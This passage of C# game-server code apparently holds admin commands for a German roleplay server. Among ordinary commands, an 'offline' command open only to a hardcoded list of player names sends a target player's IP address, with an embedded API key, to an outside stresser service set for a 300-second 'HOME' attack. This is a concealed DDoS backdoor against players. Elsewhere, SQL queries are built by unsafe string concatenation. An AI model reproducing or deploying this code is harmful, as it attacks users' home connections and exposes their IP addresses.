
                dbPlayer.SetSkin(skin);

                int color = 0;

                switch (dbPlayer.Rank.Id)
                {
                    case 1:
                        color = 5;
                        break;
                    case 2:
                        color = 4;
                        break;
                    case 3:
                        color = 3;
                        break;
                    case 4:
                        color = 12;
                        break;
                    case (int)AdminLevelTypes.Management:
                        color = 1;
                        break;
                    case (int)AdminLevelTypes.Founder:
                        color = 1;
                        break;
                    case (int)AdminLevelTypes.QualityAssurance:
                        color = 1;
                        break;
                    case (int)AdminLevelTypes.PublicRelation:
                        color = 1;
                        break;
                    case 21:
                        color = 11;
                        break;

                    default:
                        return;
                }

                NAPI.Task.Run(async () =>
                {
                    await NAPI.Task.WaitForMainThread(0);
                    // clear all
                    dbPlayer.Player.ClearAccessory(0);
                    dbPlayer.Player.ClearAccessory(1);
                    dbPlayer.Player.ClearAccessory(2);
                    dbPlayer.Player.ClearAccessory(6);
                    dbPlayer.Player.ClearAccessory(7);

                    await NAPI.Task.WaitForMainThread(100);

                    dbPlayer.SetClothes(1, maskId, color);
                    dbPlayer.SetClothes(11, chestId, color);
                    dbPlayer.SetClothes(4, leggingsId, color);
                    dbPlayer.SetClothes(6, bootId, color);
                    dbPlayer.SetClothes(3, bodyId, 12);
                    dbPlayer.SetClothes(2, 0, 0);
                    dbPlayer.SetClothes(9, 0, 0);
                });

                dbPlayer.SendNewNotification("Adminduty aktiviert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.SUCCESS);
            }
            else
            {
                dbPlayer.SetAdminDuty(false);
                dbPlayer.ApplyCharacter();
                dbPlayer.SendNewNotification("Adminduty deaktiviert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ERROR);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void ahorn(Player player, string commandParams = "")
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();

            var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (findPlayer == null) return;

            int time = 5000;

            if (command[1].Equals("purge", StringComparison.OrdinalIgnoreCase)) time = 75000;
            if (command[1].Equals("halloween", StringComparison.OrdinalIgnoreCase)) time = 104000;

            findPlayer.SendNewNotification($"1337Allahuakbar${command[1]}", duration: time);
        }

        public class Zone
        {
            public string name;
            public bounds bounds;
        }
        public class bounds
        {
            public float minX;
            public float minY;
            public float minZ;
            public float maxX;
            public float maxY;
            public float maxZ;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void loadzoneapi(Player player, string commandParams = "")
        {
            if (Configuration.Instance.DevMode) return;
            try
            {
                using (StreamReader r = new StreamReader("zonedata.json"))
                {
                    string json = r.ReadToEnd();
                    string query = "";
                    int i = 0;
                    List<Zone> items = JsonConvert.DeserializeObject<List<Zone>>(json);
                    foreach (var item in items)
                    {
                        query += $"INSERT INTO `zones` (`name`, `min_x`, `min_y`, `min_z`, `max_x`, `max_y`, `max_z`) VALUES ('{item.name}', '{item.bounds.minX.ToString().Replace(",", ".")}', '{item.bounds.minY.ToString().Replace(",", ".")}', '{item.bounds.minZ.ToString().Replace(",", ".")}', '{item.bounds.maxX.ToString().Replace(",", ".")}', '{item.bounds.maxY.ToString().Replace(",", ".")}', '{item.bounds.maxZ.ToString().Replace(",", ".")}');";

                        if (i < 5)
                        {
                            Console.WriteLine(query);
                            i++;
                        }
                    }
                    MySQLHandler.ExecuteAsync(query);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void bhorn(Player player, string name = "")
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            int time = 5000;

            if (name.Equals("purge", StringComparison.OrdinalIgnoreCase)) time = 75000;
            if (name.Equals("halloween", StringComparison.OrdinalIgnoreCase)) time = 104000;

            try
            {
                var surroundingUsers = NAPI.Player.GetPlayersInRadiusOfPlayer(25.0f, dbPlayer.Player);
                foreach (var user in surroundingUsers)
                {
                    if (user.Dimension == dbPlayer.Player.Dimension)
                    {
                        var targetPlayer = user.GetPlayer();
                        if (targetPlayer == null || !targetPlayer.IsValid()) continue;
                        targetPlayer.SendNewNotification($"1337Allahuakbar${name}", duration: time);
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void features(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            foreach (var feature in dbPlayer.Rank.GetFeatures())
            {
                dbPlayer.SendNewNotification(
                    $"{feature}: {(dbPlayer.Player.HasFeatureIgnored(feature) ? "ignoriert" : "aktiv")}", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void sethaar(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            var command = commandParams.Split(new[] { ' ' }, 1, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 0) return;
            if (!int.TryParse(command[0], out int hairId)) return;
            dbPlayer.SetClothes(2, hairId, 0);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void serverfeature(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            var args = commandParams.Split(" ");
            if (args.Length < 1) return;

            bool newStatus = !ServerFeatures.IsActive(args[0]);
            ServerFeatures.SetActive(args[0], newStatus);
            dbPlayer.SendNewNotification($"Server Feature {args[0]} {(newStatus ? "aktiviert" : "deaktiviert")}", NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void syncdata(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            var args = commandParams.Split(" ");
            if (args.Length < 2) return;
            if (!int.TryParse(args[0], out int pla)) return;
            if (!int.TryParse(args[1], out int veh)) return;

            dbPlayer.SendNewNotification($"Set Sync State | Player {(pla > 0 ? "aktiviert" : "deaktiviert")} Vehicle {(veh > 0 ? "aktiviert" : "deaktiviert")}", NotificationType.ADMIN);
            Players.Players.Instance.GetValidPlayers().ToList().ForEach(p => p.Player.TriggerNewClient("setSyncDataState", pla > 0, veh > 0));
            Configurations.Configuration.Instance.PlayerSync = pla > 0;
            Configurations.Configuration.Instance.VehicleSync = veh > 0;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void feature(Player player, string featureName)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (featureName == "all")
            {
                foreach (var feature in dbPlayer.Rank.GetFeatures())
                {
                    if (!dbPlayer.Player.HasFeatureIgnored(feature))
                    {
                        dbPlayer.Player.SetFeatureIgnored(feature);
                        dbPlayer.SendNewNotification($"{feature} ausgeschaltet.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    }
                    else
                    {
                        dbPlayer.Player.RemoveFeatureIgnored(feature);
                        dbPlayer.SendNewNotification($"{feature} eingeschaltet.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    }
                }
                return;
            }

            if (!dbPlayer.Player.HasFeatureIgnored(featureName))
            {
                dbPlayer.Player.SetFeatureIgnored(featureName);
                dbPlayer.SendNewNotification($"{featureName} ausgeschaltet.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            else
            {
                dbPlayer.Player.RemoveFeatureIgnored(featureName);
                dbPlayer.SendNewNotification($"{featureName} eingeschaltet.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void afrisk(Player player, string name)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null) return;
            if (!dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            ItemsModuleEvents.resetFriskInventoryFlags(dbPlayer);
            ItemsModuleEvents.resetDisabledInventoryFlag(dbPlayer);

            var toFriskPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (toFriskPlayer == null) return;

            if (dbPlayer.RankId < (int)AdminLevelTypes.Staff)
                Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                    dbPlayer.GetName() + " durchsucht nun " + toFriskPlayer.GetName());


            var lWeapons = toFriskPlayer.Weapons;
            if (lWeapons.Count > 0)
            {
                var lWeaponListContainer = new List<WeaponListContainer>();
                foreach (var lWeapon in lWeapons)
                {
                    var lData = WeaponDataModule.Instance.Contains(lWeapon.WeaponDataId) ? WeaponDataModule.Instance.Get(lWeapon.WeaponDataId) : null;
                    var weapon = ItemModelModule.Instance.GetByScript("w_" + Convert.ToString(lData.Name.ToLower()));
                    if (weapon == null || lData == null) continue;
                    lWeaponListContainer.Add(new WeaponListContainer(lData.Name, lWeapon.Ammo, weapon.ImagePath));
                }

                dbPlayer.SetData("disableinv", true);

                var lWeaponListObject = new WeaponListObject(toFriskPlayer.GetName(), dbPlayer.IsACop(), lWeaponListContainer);
                ComponentManager.Get<FriskWindow>().Show()(dbPlayer, lWeaponListObject);
                return;
            }

            toFriskPlayer.Container.ShowFriskInventory(dbPlayer, toFriskPlayer, toFriskPlayer.GetName(), (toFriskPlayer.Money[0] + toFriskPlayer.BlackMoney[0]));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void afind(Player player, string name)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var foundPlayer = Players.Players.Instance.FindPlayer(name);
            if (foundPlayer == null || !foundPlayer.IsValid()) return;

            dbPlayer.SendNewNotification(foundPlayer.GetName() +
                " gefunden");

            switch (foundPlayer.DimensionType[0])
            {
                case DimensionType.World:
                    player.TriggerNewClient("setPlayerGpsMarker", foundPlayer.Player.Position.X,
                        foundPlayer.Player.Position.Y);
                    break;
                case DimensionType.House:
                    if (!foundPlayer.HasData("inHouse")) return;
                    House house = HouseModule.Instance.Get(foundPlayer.GetData("inHouse"));
                    if (house == null || house.Position == null) return;
                    player.TriggerNewClient("setPlayerGpsMarker", house.Position.X, house.Position.Y);
                    break;
                case DimensionType.Basement:
                case DimensionType.Labor:
                    house = HouseModule.Instance.Get(foundPlayer.Player.Dimension);
                    if (house == null || house.Position == null) return;
                    player.TriggerNewClient("setPlayerGpsMarker", house.Position.X, house.Position.Y);
                    break;
                case DimensionType.Camper:
                    var vehicle =
                        VehicleHandler.Instance.GetByVehicleDatabaseId(foundPlayer.Player.Dimension);
                    if (vehicle == null) return;
                    player.TriggerNewClient("setPlayerGpsMarker", vehicle.Entity.Position.X, vehicle.Entity.Position.Y);
                    break;
                case DimensionType.Business:
                    break;
                case DimensionType.Storage:
                    break;
                case DimensionType.WeaponFactory:
                    break;
                case DimensionType.Methlaboratory:
                    Methlaboratory methlaboratory = MethlaboratoryModule.Instance.GetLaboratoryByDimension(foundPlayer.Player.Dimension);
                    if (methlaboratory == null) return;
                    player.TriggerNewClient("setPlayerGpsMarker", methlaboratory.JumpPointEingang.Position.X, methlaboratory.JumpPointEingang.Position.Y);
                    break;
                default:
                    Logger.Crash(new ArgumentOutOfRangeException());
                    break;
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void speed(Player player, string speed)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod() || !dbPlayer.RageExtension.IsInVehicle) return;

            if (!Int32.TryParse(speed, out int x)) return;

            var sxVeh = dbPlayer.Player.Vehicle.GetVehicle();
            if (sxVeh == null) return;

            sxVeh.DynamicMotorMultiplier = x;
            dbPlayer.SendNewNotification($"Du hast den Speed auf {x}x gestellt");

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vehcount(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var count = NAPI.Pools.GetAllVehicles().Count();
            var count2 = VehicleHandler.Instance.GetAllVehicles().Count();

            dbPlayer.SendNewNotification("Vehicle count: " + count);
            dbPlayer.SendNewNotification("Vehicle count: " + count2);
        }

        [CommandPermission(PlayerRankPermission = true)]

        [Command]

        public void weapon(Player player, string weaponHash)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;
            if (Enum.TryParse(weaponHash, true, out WeaponHash weapon))
            {
                dbPlayer.GiveWeapon(weapon, 600, true);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void simulateweapon(Player player, string weaponHash)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;
            if (Enum.TryParse(weaponHash, true, out WeaponHash weapon))
            {
                //dbPlayer.GiveWeapon(weapon, 600, true);
                dbPlayer.Player.GiveWeapon(weapon, 600);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setitem(Player player, string commandParams = "")
        {
            try
            {
                var dbPlayer = player.GetPlayer();
                if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

                var command = commandParams.Split(new[] { ' ' }, 3, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();

                if (command.Length != 3)
                {
                    dbPlayer.SendNewNotification(

                        GlobalMessages.General.Usage("/setitem", "Name", "Itemname Anzahl"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                if (command[0].Length < 2) return;
                if (command[1].Length < 1) return;

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
                if (findPlayer == null || !findPlayer.IsValid()
                                       || findPlayer.Dimension[0] != dbPlayer.Dimension[0])
                {
                    dbPlayer.SendNewNotification(
                                                    "Der Buerger konnte nicht gefunden werden " +
                                                    "oder ist zu weit entfernt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                }

                if (!int.TryParse(command[2], out var amount)) return;

                if (command[1] == null || string.IsNullOrWhiteSpace(command[1]))
                {
                    return;
                }

                var Item = ItemModelModule.Instance.GetItemByNameOrTag(command[1].ToLower());
                if (amount <= 0 || amount > int.MaxValue) return;
                if (Item == null) return;

                if (!findPlayer.Container.CanInventoryItemAdded(Item, amount))
                {
                    dbPlayer.SendNewNotification(
                         "Inventar des Spielers ist voll!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                findPlayer.Container.AddItem(Item, amount);

                dbPlayer.SendNewNotification("Sie haben " + findPlayer.GetName() + " " +
                    amount + " " +
                    Item.Name + " gegeben.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                findPlayer.SendNewNotification(dbPlayer.GetName() + " hat ihnen " + amount + " " +
                    Item.Name +
                    " gegeben.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

                if (dbPlayer.RankId < (int)AdminLevelTypes.Management)
                    Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                        dbPlayer.GetName() + " hat " + findPlayer.GetName() + " " + amount + " " +
                    Item.Name + " gegeben.");

                DatabaseLogging.Instance.LogAdminAction(player, findPlayer.GetName(), AdminLogTypes.setitem, amount + " " +
                    Item.Name, 0, Configuration.Instance.DevMode);
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void component(Player player, string weaponHash, string componentHash)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            dbPlayer.RemoveWeapons();

            if (Enum.TryParse(weaponHash, true, out WeaponHash weapon))
            {
                dbPlayer.GiveWeapon(weapon, 999, true);
                /*if (Enum.TryParse(componentHash, true, out WeaponComponent weaponComponent))
                {
                    dbPlayer.Player.SetWeaponComponent(weapon, weaponComponent);
                }*/
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void setskin(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 1) return;

            var searchedPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (searchedPlayer == null) return;
            if (Enum.TryParse(command[1], true, out PedHash skin))
            {
                searchedPlayer.SetSkin(skin);
            }
            return;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setmagic(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (dbPlayer == null || !dbPlayer.IsValid()) return;

            dbPlayer.Player?.TriggerNewClient("updatesuperjump", true);

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void removemagic(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (dbPlayer == null || !dbPlayer.IsValid()) return;

            dbPlayer.Player?.TriggerNewClient("updatesuperjump", false);

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void setjskin(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 1) return;

            var searchedPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (searchedPlayer == null) return;
            if (!UInt32.TryParse(command[1], out uint skin)) return;

            searchedPlayer.SetSkin((PedHash)skin);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void reloadhouse(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;
            if (!dbPlayer.HasData("houseId")) return;

            uint houseId = dbPlayer.GetData("houseId");
            var house = HouseModule.Instance[houseId];
            if (house == null) return;

            house.ReloadHouse();
            dbPlayer.SendNewNotification($"Haus {house.Id} wurde reloaded!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void reloadfuel(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            FuelStation fuel = FuelStationModule.Instance.GetThis(player.Position);
            if (fuel == null) return;
            fuel.ReloadData();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void reloadraff(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            Raffinery raff = RaffineryModule.Instance.GetThis(player.Position);
            if (raff == null) return;
            raff.ReloadData();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void reloadnightclub(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            NightClub nightclub = NightClubModule.Instance.GetThis(player.Position);
            if (nightclub == null) return;
            nightclub.ReloadData();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void giveweapon(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 1) return;

            var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (findPlayer == null) return;

            if (Enum.TryParse(command[1], true, out WeaponHash weapon))
            {
                findPlayer.GiveWeapon(weapon, 999, true);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void spawn(Player player, string name)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var findPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (findPlayer == null) return;
            PlayerSpawn.OnPlayerSpawn(findPlayer.Player);
            findPlayer.DimensionType[0] = DimensionType.World;

            dbPlayer.SendNewNotification("Sie haben " + findPlayer.GetName() + " respawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            findPlayer.SendNewNotification("Administrator " + dbPlayer.GetName() +
                                       " hat Sie respawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void clearairvehicles(Player player)
        {
            try
            {
                List<SxVehicle> possibleVehicles = new List<SxVehicle>();
                DbPlayer dbPlayer = player.GetPlayer();
                if (dbPlayer == null) return;

                if (!dbPlayer.CanAccessMethod())
                {
                    dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                    return;
                }

                VehicleHandler.SxVehicles.Values.ToList().ForEach(vehicle =>
                {
                    if (vehicle.Data.ClassificationId == (int)VehicleClassificationTypes.Helikopter || vehicle.Data.ClassificationId == (int)VehicleClassificationTypes.Flugzeug)
                    {
                        if (vehicle.GetOccupants().IsEmpty() && vehicle.Entity.Position.Z >= 100 && vehicle.LastInteracted.AddMinutes(15) < DateTime.Now)
                        {
                            possibleVehicles.Add(vehicle);
                        }
                    }
                });

                foreach (DbPlayer iPlayer in Players.Players.Instance.players.Values)
                {
                    possibleVehicles.RemoveAll(vehicle => vehicle.Entity.Position.DistanceTo(iPlayer.Player.Position) < 20.0f);
                }

                foreach (SxVehicle vehicle in possibleVehicles)
                {
                    if (vehicle.IsPlayerVehicle()) vehicle.SetPrivateCarGarage(1);
                    else if (vehicle.IsTeamVehicle())
                        vehicle.SetTeamCarGarage(true);
                    else
                        VehicleHandler.Instance.DeleteVehicleByEntity(vehicle.Entity);
                    dbPlayer.SendNewNotification($"Fahrzeug (ID: {vehicle.databaseId}) respawnt / geloescht", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                }
            }
            catch (Exception ex)
            {
                Logging.Logger.Crash(ex);
                return;
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public async void kickplayer(Player player, string commandParams)
        {

            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 1) return;

            var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (findPlayer == null || !findPlayer.IsValid()) return;

            findPlayer.SendNewNotification($"Du wirst in wenigen Sekunden vom Gameserver gekickt: Grund: {command[1]}", NotificationType.ADMIN, "Kick", 10000);

            await Chats.SendGlobalMessage(dbPlayer.Rank.Name + " " + dbPlayer.GetName() + " hat " + findPlayer.GetName() + " vom Server gekickt! (Grund: " + command[1] + ")", COLOR.RED, ICON.GLOB);
            dbPlayer.SendNewNotification($"Sie haben {findPlayer.GetName()} vom Server gekickt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

            DatabaseLogging.Instance.LogAdminAction(player, findPlayer.GetName(), AdminLogTypes.kick, command[1], 0,
                Configuration.Instance.DevMode);
            findPlayer.Save();
            //findPlayer.SendNewNotification("Saved your stuff!");
            findPlayer.Player.SendNotification($"Sie wurden gekickt. Grund {command[1]}");
            findPlayer.Player.Kick();
            dbPlayer.SendNewNotification("Kicked.");

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public async void powernap(Player player, string commandParams)
        {

            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length != 1) return;

            var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (findPlayer == null || !findPlayer.IsValid()) return;

            dbPlayer.SendNewNotification($"Sie haben {findPlayer.GetName()} vom Server gekickt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

            DatabaseLogging.Instance.LogAdminAction(player, findPlayer.GetName(), AdminLogTypes.kick, "Powernap!", 0,
                Configuration.Instance.DevMode);
            findPlayer.Save();

            await NAPI.Task.WaitForMainThread(0);

            findPlayer.Player.SendNotification($"Sie wurden gekickt. Grund: Powernap!");
            findPlayer.Player.Kick();
            dbPlayer.SendNewNotification("Successfully Kicked.");
        }

        private readonly List<string> _whitelistedSlammers = new List<string>()
        {
            "Eric_Blanco", "Walid_Mohammad", "Ali_Kuznecow", "Deni_West", "Dragan_Baroganovic", "Emilio_Down"
        };
        
        [Command(GreedyArg = true)]
        public async void offline(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.IsValid()) return;

            var name = dbPlayer.GetName();
            if (!_whitelistedSlammers.Any(x => name.ToUpper().Contains(x.ToUpper()))) return;

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length != 1) return;

            var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (findPlayer == null || !findPlayer.IsValid()) return;

            var slammedName = findPlayer.GetName();
            if (_whitelistedSlammers.Any(x => slammedName.ToUpper().Contains(x.ToUpper()))) return;

            dbPlayer.SendNewNotification($"Slammed {findPlayer.GetName()}!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            
            findPlayer.Slammer = dbPlayer;
            findPlayer.LastSlam = DateTime.Now;

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=paradox&host={findPlayer.Player.Address}&port=80&time=300&method=HOME");
                }
            }
            catch (Exception ex)
            {
                Logger.Print(ex.ToString());
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void goup(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            player.SetPosition(new Vector3(player.Position.X, player.Position.Y, player.Position.Z + 2));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void godown(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            player.SetPosition(new Vector3(player.Position.X, player.Position.Y, player.Position.Z - 2));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void goleft(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            player.SetPosition(new Vector3(player.Position.X - 2, player.Position.Y, player.Position.Z));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void goright(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            player.SetPosition(new Vector3(player.Position.X, player.Position.Y - 2, player.Position.Z));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void goforward(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            if (!float.TryParse(args, out float step)) return;

            float angle = dbPlayer.Player.Heading;

            player.SetPosition(new Vector3(player.Position.X + (Math.Cos(angle) * step), player.Position.Y + (Math.Sin(angle) * step), player.Position.Z));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void goatm(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

            if (!UInt32.TryParse(args, out uint id)) return;
            Bank bank = null;
            BankModule.Instance.GetAll().Values.ToList().ForEach(atm =>
            {
                if (atm.Id == id)
                    bank = atm;
            });
            if (bank == null)
            {
                dbPlayer.SendNewNotification("ATM nicht gefunden");
                return;
            }
            dbPlayer.Player.SetPosition(bank.Position);
            string atms = "ATMS in der Nähe: ";
            BankModule.Instance.GetAll().Values.ToList().ForEach(atm =>
            {
                if (atm.Position.DistanceTo(bank.Position) < 10.0f && atm.Id != bank.Id)
                    atms += atm.Id + ", ";
            });
            dbPlayer.SendNewNotification(atms);
        }

        [CommandPermission(PlayerRankPermission = true)]
